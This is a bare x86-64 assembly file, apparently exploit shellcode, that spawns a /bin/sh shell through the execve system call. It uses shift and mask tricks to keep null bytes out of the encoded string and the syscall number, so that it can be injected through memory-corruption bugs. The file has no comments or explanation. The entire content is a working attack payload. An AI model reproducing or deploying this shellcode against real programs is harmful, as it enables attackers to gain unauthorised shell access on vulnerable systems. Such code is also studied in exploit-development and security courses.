.section .data
.section .text
.global _start
_start:
xor %rsi, %rsi
xor %rdx, %rdx
movq $0x4468732f6e69622f, %rbx
shl $0x08, %rbx
shr $0x08, %rbx
push %rbx
movq $0x1111113b, %rax
mov %rsp, %rdi 
shl $0x38, %rax
shr $0x38, %rax
syscall

